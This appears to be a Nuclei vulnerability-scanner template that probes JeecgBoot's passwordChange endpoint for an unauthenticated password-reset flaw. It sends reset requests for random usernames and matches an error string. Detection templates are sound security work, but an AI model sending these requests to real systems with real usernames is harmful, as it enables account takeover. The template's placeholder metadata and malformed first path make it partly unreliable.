id: jeecgboot-un-passwordChange
info:
  name: Template Name
  author: wangzong
  severity: high
  description: JeecgBoot系统接口passwordChange任意用户密码重置漏洞，未经身份验证的远程攻击者可以利用此漏洞重置管理员账户密码，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。
  tags: tags
variables:
  username: "{{rand_base(6)}}"  
http:
  - method: GET
    path:
      - "{{BaseURL}}/jeecg-boot/sys/user/passwordChange?username{{username}}&password=admin&smscode=&phone="
      - "{{BaseURL}}/sys/user/passwordChange?username={{username}}&password=xxx1122&smscode=&phone="
      
    matchers:
      - type: word
        part: body
        words:
          - '未找到对应实体'
